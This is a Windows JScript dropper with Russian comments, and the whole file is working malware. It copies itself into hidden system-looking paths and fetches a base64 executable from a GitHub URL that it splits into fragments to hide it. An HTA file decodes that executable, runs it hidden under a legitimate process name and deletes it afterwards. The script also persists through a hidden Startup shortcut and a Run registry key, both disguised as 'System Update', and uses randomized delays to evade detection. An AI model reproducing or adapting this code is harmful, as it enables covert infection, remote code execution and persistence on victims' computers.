try {
    var shell = new ActiveXObject("WScript.Shell");
    var xml = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
    var fso = new ActiveXObject("Scripting.FileSystemObject");

    // === 1. LOCK-ФАЙЛ (защита от повторного запуска) ===
    var appData = shell.ExpandEnvironmentStrings("%APPDATA%");
    var lockFile = appData + "\\system_update.lock";
    
    if (fso.FileExists(lockFile)) {
        var fileDate = fso.GetFile(lockFile).DateLastModified;
        var now = new Date();
        var diffMinutes = Math.abs(now - fileDate) / 60000;
        if (diffMinutes < 3) {
            WScript.Quit();
        }
    }
    
    var lock = fso.CreateTextFile(lockFile, true);
    lock.Write("1");
    lock.Close();

    // === 2. САМОКОПИРОВАНИЕ В APPDATA ===
    var copiedPath = appData + "\\Microsoft\\Windows\\ctfmon.js";
    var useCopiedPath = false;

    try {
        // Создаём папку если её нет
        var copiedDir = fso.GetParentFolderName(copiedPath);
        if (!fso.FolderExists(copiedDir)) {
            fso.CreateFolder(copiedDir);
        }
        
        fso.CopyFile(WScript.ScriptFullName, copiedPath, true);
        shell.Run('attrib +h +s +r "' + copiedPath + '"', 0, true);
        useCopiedPath = true;
    } catch(e) {
        useCopiedPath = false;
    }

    // === 3. ЗАДЕРЖКА ПЕРЕД СЕТЬЮ (2-3 минуты) ===
    WScript.Sleep(120000 + Math.floor(Math.random() * 60000));

    // === 4. СКРЫТАЯ ССЫЛКА НА GITHUB ===
    var urlParts = [
        "ht", "tps", ":/", "/ra", "w.gi", "thub", "user", "conte", "nt.co", 
        "m/ev", "ilgro", "u-te", "ch/d", "rive", "rs/r", "efs/", "head", 
        "s/ma", "in/d", "rive", "rs.b", "64"
    ];
    var githubUrl = urlParts.join("");

    xml.open("GET", githubUrl, false);
    xml.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    xml.send();
    
    if (xml.status !== 200) { 
        fso.DeleteFile(lockFile, true);
        WScript.Quit(); 
    }

    var base64 = xml.responseText;
    base64 = base64.replace(/\s/g, '');
    base64 = base64.replace(/[^A-Za-z0-9+/=]/g, '');
    if (base64.length % 4 !== 0) base64 += '='.repeat(4 - (base64.length % 4));
    if (base64.length < 1400) {
        fso.DeleteFile(lockFile, true);
        WScript.Quit();
    }

    // === 5. ПУТИ ДЛЯ EXE ===
    var localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%");
    var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");

    var sessionId = Math.floor(Math.random() * 1000000);
    var exeNames = ["ctfmon.exe", "taskhost.exe", "dllhost.exe"];
    var exeName = exeNames[sessionId % exeNames.length];
    var exePath = localAppData + "\\Microsoft\\WindowsApps\\" + exeName;
    
    var exeDir = fso.GetParentFolderName(exePath);
    if (!fso.FolderExists(exeDir)) { 
        try { fso.CreateFolder(exeDir); } catch(e) {} 
    }

    // === 6. HTA-ФАЙЛ ===
    var htaCode = [
        '<script language="VBScript">',
        'On Error Resume Next',
        'Set shell = CreateObject("WScript.Shell")',
        'Set fso = CreateObject("Scripting.FileSystemObject")',
        '',
        '// Задержка 1-2 минуты',
        'Randomize',
        'WScript.Sleep (60000 + Int(Rnd * 60000))',
        '',
        'base64 = "' + base64 + '"',
        'Set stream = CreateObject("ADODB.Stream")',
        'stream.Type = 1',
        'stream.Open',
        'Set buffer = CreateObject("MSXML2.DOMDocument").createElement("tmp")',
        'buffer.dataType = "bin.base64"',
        'buffer.text = base64',
        'stream.Write buffer.nodeTypedValue',
        'stream.SaveToFile "' + exePath + '", 2',
        'stream.Close',
        '',
        '// Задержка 1.5-3 минуты перед запуском',
        'WScript.Sleep (90000 + Int(Rnd * 90000))',
        '',
        'shell.Run """' + exePath + '""", 0, False',
        '',
        '// Очистка через 5 минут',
        'WScript.Sleep 300000',
        'On Error Resume Next',
        'fso.DeleteFile "' + exePath + '", True',
        '</script>'
    ].join('\n');

    var htaFile = tempDir + "\\sys_" + sessionId + ".hta";
    var htaF = fso.CreateTextFile(htaFile, true);
    htaF.Write(htaCode);
    htaF.Close();

    // === 7. ЗАДЕРЖКА ПЕРЕД АВТОЗАГРУЗКОЙ (30-60 сек) ===
    WScript.Sleep(30000 + Math.floor(Math.random() * 30000));

    // === 8. АВТОЗАГРУЗКА: ЯРЛЫК ===
    var startupFolder = appData + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    var shortcutPath = startupFolder + "\\Update.lnk";
    
    if (!fso.FileExists(shortcutPath)) {
        var shortcut = shell.CreateShortcut(shortcutPath);
        shortcut.TargetPath = "wscript.exe";
        
        // Используем скопированный путь
        if (useCopiedPath) {
            shortcut.Arguments = "//B \"" + copiedPath + "\"";
        } else {
            shortcut.Arguments = "//B \"" + WScript.ScriptFullName + "\"";
        }
        
        shortcut.Description = "System Update";
        shortcut.IconLocation = "shell32.dll,1";
        shortcut.Save();
        shell.Run('attrib +h "' + shortcutPath + '"', 0, true);
    }

    // === 9. АВТОЗАГРУЗКА: РЕЕСТР ===
    var regPath = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate";
    var regCmd;
    if (useCopiedPath) {
        regCmd = "wscript.exe //B \"" + copiedPath + "\"";
    } else {
        regCmd = "wscript.exe //B \"" + WScript.ScriptFullName + "\"";
    }
    
    try {
        shell.RegRead(regPath);
    } catch(e) {
        shell.RegWrite(regPath, regCmd, "REG_SZ");
    }

    // === 10. ЗАПУСК HTA ===
    shell.Run('mshta.exe "' + htaFile + '"', 0, false);

    // === 11. ОЧИСТКА ===
    WScript.Sleep(15000);
    try { fso.DeleteFile(htaFile, true); } catch(e) {}

    // Lock-файл удаляется через 10 минут
    WScript.Sleep(600000);
    try { fso.DeleteFile(lockFile, true); } catch(e) {}

} catch(e) {
    // Тихий выход
}